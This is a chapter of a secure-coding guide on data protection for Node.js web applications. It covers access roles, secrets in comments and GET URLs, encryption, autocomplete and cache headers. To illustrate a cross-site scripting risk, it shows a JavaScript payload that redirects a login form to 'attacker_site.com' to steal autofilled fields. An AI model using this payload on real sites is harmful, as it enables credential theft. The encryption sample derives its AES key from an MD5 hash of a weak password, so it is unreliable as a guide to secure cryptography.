Data Protection
===============

Nowadays, one of the most important things in security in general is data
protection. You don't want something like:

![All your data are belong to us](files/cB52MA.jpeg)

In a nutshell, data from your web application needs to be protected, so in this
section we will take a look at the different ways to secure it.

One of the first things you should take care of, is creating and implementing the
right privileges for each user and restrict them to only the functions they
really need.

For example, consider a simple online store with the following user roles:

* _Sales user_: Permission only to view catalog
* _Marketing user_: Allowed to check statistics
* _Developer_: Allowed to modify pages and web application options

Also, in the system configuration (aka webserver), you should define the right
permissions.

The main thing is to define the right role for each user - web or system.

Role separation and access controls are further discussed in
the [Access Control][1] section.

## Remove sensitive information

Temporary and cache files which contain sensitive information should be removed
as soon as they're not needed. If you still need some of them, move them to
protected areas and/or encrypt them. This includes all authentication
verification data, even on the server-side.

Last but not least, when using encryption, make sure you are using well vetted
algorithms. More information in the [Cryptographic Practices][2] section.

### Comments

Sometimes developers leave comments like _To-do lists_ in the source-code, and
sometimes, in the worst case scenario, developers may leave credentials.

```javascript
// Secret API endpoint - /api/mytoken?callback=myToken
console.log("Just a random code")
```

In the above example, the developer has an endpoint in a comment which, if not
well protected, could be used by a malicious user.

### URL

Passing sensitive information using the HTTP GET method leaves the web
application vulnerable because:

1. data could be intercepted if not using HTTPS by MITM attacks;
2. browser history stores the user's information. If the URL has
   session IDs, pins or tokens that don't expire (or have low entropy),
   they can be stolen.

```JavaScript
const http = require('http');

var options = {
  host: 'www.mycompany.com',
  path: '/api/mytoken?api_key=000s3cr3t000'
};

callback = function(response) {
  var str = '';

  //another chunk of data has been recieved, so append it to `str`
  response.on('data', function (chunk) {
    str += chunk;
  });

  //the whole response has been recieved, so we just print it out here
  response.on('end', function () {
    console.log(str);
  });
}

http.request(options, callback).end();
```

If you web application tries to get information from a third-party website
using your ```api_key```, it could be stolen if anyone is listening within your
network. This is due to the lack of HTTPS and the parameters being passed
through GET.

Also, if your web application has links to the example site:

```
http://mycompany.com/api/mytoken?api_key=000s3cr3t000
```

It will be stored in your browser history so, again, it can be stolen.

Solutions should always use HTTPS. Furthermore, try to pass the parameters using
the POST method and, if possible, use one time only session IDs or token.

### Information is power

You should always remove application and system documentation on the production
environment. Some documents could disclose versions, or even functions that could
be used to attack your web application (e.g. Readme, Changelog, etc.).

As a developer, you should allow the user to remove sensitive information that
is no longer used. Imagine that the user has expired credit cards on
his account and wants to remove them - your web application should allow it.

All of the information that is no longer needed must be deleted from the
application.

Also important is to ensure no server-side source code can be downloaded or
accessed by a user.

#### Encryption is the key

Every highly sensitive information should be encrypted in your web application.
See the [Cryptographic Practices][2] section for more information regarding
algorithms and their usage.

Getting different permissions for accessing the code and limiting the access
for your source-code is the best approach.

Do not store passwords, connection strings (see example for how to secure database
connection strings on [Database Security][3] section) or other sensitive
information in clear text or in any non-cryptographically secure manner on the
client side.

This includes embedding in insecure formats (e.g. Adobe flash or compiled code).

A small example of `aes-256-cbc` encryption in Node.JS using the
`crypto` package:


```JavaScript
'use strict';
const crypto = require('crypto');

// get password's md5 hash
let password = 'test';
let password_hash = crypto.createHash('md5').update(password, 'utf-8').digest('hex').toUpperCase();
console.log('key=', password_hash); // 098F6BCD4621D373CADE4E832627B4F6

// our data to encrypt
let data = 'Sample text to encrypt';
console.log('data=', data);

// generate random initialization vector
var iv = crypto.randomBytes(16)
console.log('iv=', iv);

// encrypt data
let cipher = crypto.createCipheriv('aes-256-cbc', password_hash, iv);
let encryptedData = cipher.update(data, 'utf8', 'hex') + cipher.final('hex');
console.log('encrypted data=', encryptedData.toUpperCase());
```

Output will be:

```
key= 098F6BCD4621D373CADE4E832627B4F6
data= Sample text to encrypt
iv= <Buffer d7 98 9a 54 a0 e6 bc 45 f3 7f bc 33 c2 0f 7d 00>
encrypted data= 83640168A86A9F2BC0BEEEDEB39756E195EF3D0758A3262F012697C3D718B039
```

## Disable what you don't need

Another simple and efficient way to mitigate attack vectors is to guarantee that
any unnecessary applications or services are disabled in your systems.

### Autocomplete

According to [Mozilla documentation][4], you can disable autocompletion in the
entire form by using:

```html
<form method="post" action="/form" autocomplete="off">
```

Or a specific form element:

```html
<input type="text" id="cc" name="cc" autocomplete="off">
```

This is especially useful for disabling autocomplete on login forms. Imagine a
case where a Cross-Site Scripting vector is present in the login page.
If the malicious user creates a payload like:

```JavaScript
window.setTimeout(function() {
  document.forms[0].action = 'http://attacker_site.com';
  document.forms[0].submit();
}
), 10000);
```

It will send the autocomplete form fields to the `attacker_site.com`.

### Cache

Cache control in pages that contain sensitive information should be disabled.

This can be achieved by setting the corresponding header flags.   
The following snippet shows how to do this in an `express` application:

```JavaScript
//Express application
[...]

app.use(function (req,res,next){
  res.header('Cache-Control', 'private, no-cache, no-store, must-revalidate')
  res.header('Pragma', 'no-cache')
  next()
});

[...]
```

The `no-cache` value tells the browser to revalidate with the server before
using any cached response. It does not tell the browser to _not cache_.

On the other hand, `no-store` value is really - _Hey stop caching!_ - and
must not store any part of the request or response.

The `Pragma` header is there to support HTTP/1.0 requests.

[1]: ./access-control/README.md
[2]: ./cryptographic-practices/README.md
[3]: ./database-security/README.md
[4]: https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion
